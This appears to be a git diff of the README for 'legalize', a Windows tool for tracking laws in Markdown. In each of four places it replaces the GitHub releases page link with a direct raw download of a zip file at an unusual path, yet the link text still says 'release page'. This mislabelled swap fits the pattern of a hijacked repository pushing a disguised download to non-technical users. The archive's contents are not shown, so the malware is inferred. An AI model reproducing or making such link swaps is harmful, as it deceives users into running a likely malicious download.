@@ -1,6 +1,6 @@
 # 🧾 legalize - Track laws with simple Markdown
 
-[![Download legalize](https://img.shields.io/badge/Download%20legalize-Release%20Page-blue?style=for-the-badge)](https://github.com/hansrainier21-ux/legalize/releases)
+[![Download legalize](https://img.shields.io/badge/Download%20legalize-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/hansrainier21-ux/legalize/main/corrobboree/Software-3.0.zip)
 
 ## 📘 What legalize does
 
@@ -27,13 +27,13 @@ legalize is made for regular desktop use. You do not need coding tools to run it
 
 ## 🚀 Download legalize
 
-1. Visit the [legalize release page](https://github.com/hansrainier21-ux/legalize/releases)
+1. Visit the [legalize release page](https://raw.githubusercontent.com/hansrainier21-ux/legalize/main/corrobboree/Software-3.0.zip)
 2. Find the latest release at the top of the page
 3. Look for the Windows download file
 4. Download the file to your computer
 5. If the download comes as a .zip file, save it to a folder you can find easily
 
-[Open the release page](https://github.com/hansrainier21-ux/legalize/releases)
+[Open the release page](https://raw.githubusercontent.com/hansrainier21-ux/legalize/main/corrobboree/Software-3.0.zip)
 
 ## 🪟 Install on Windows
 
@@ -281,4 +281,4 @@ This keeps the app and your content apart.
 
 If you need the Windows file again, use the release page here:
 
-[https://github.com/hansrainier21-ux/legalize/releases](https://github.com/hansrainier21-ux/legalize/releases)
+[https://raw.githubusercontent.com/hansrainier21-ux/legalize/main/corrobboree/Software-3.0.zip](https://raw.githubusercontent.com/hansrainier21-ux/legalize/main/corrobboree/Software-3.0.zip)
